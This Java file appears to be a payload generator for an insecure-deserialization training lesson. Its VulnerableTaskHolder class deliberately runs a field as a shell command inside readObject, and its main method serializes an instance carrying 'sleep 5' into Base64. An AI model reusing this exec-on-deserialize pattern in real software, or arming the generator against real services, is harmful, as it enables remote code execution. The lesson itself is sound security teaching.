// package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.io.*;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

    private static final long serialVersionUID = 2;

    private String taskName;
    private String taskAction;
    private LocalDateTime requestedExecutionTime;

    public VulnerableTaskHolder(String taskName, String taskAction) {
        super();
        this.taskName = taskName;
        this.taskAction = taskAction;
        this.requestedExecutionTime = LocalDateTime.now().plusMinutes(2);
    }

    private void readObject(ObjectInputStream stream) throws Exception {
        // deserialize data so taskName and taskAction are available
        stream.defaultReadObject();

        // blindly run some code. #code injection
        Runtime.getRuntime().exec(taskAction);
    }

    public static void main(String[] args) {
        // generateExploit();
        // var d = deserializeBase64("rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l");
        // System.out.println(d.taskName + " " + d.taskAction + " " + d.requestedExecutionTime);
        String res = serializeTobase64(new VulnerableTaskHolder("hej", "sleep 5"));
        System.out.println(res);
    }

    public static String serializeTobase64(VulnerableTaskHolder go) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(go);
            oos.flush();
            byte[] exploit = bos.toByteArray();
            String serializedObject = java.util.Base64.getEncoder().encodeToString(exploit);
            return serializedObject;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static VulnerableTaskHolder deserializeBase64(String serialized) {
        try {
            byte[] data = java.util.Base64.getDecoder().decode(serialized);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object o = ois.readObject();
            return (VulnerableTaskHolder) o;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static VulnerableTaskHolder deserialize(String serialized) {
        try {
            byte[] data = serialized.getBytes("ISO-8859-1");
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object o = ois.readObject();
            return (VulnerableTaskHolder) o;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
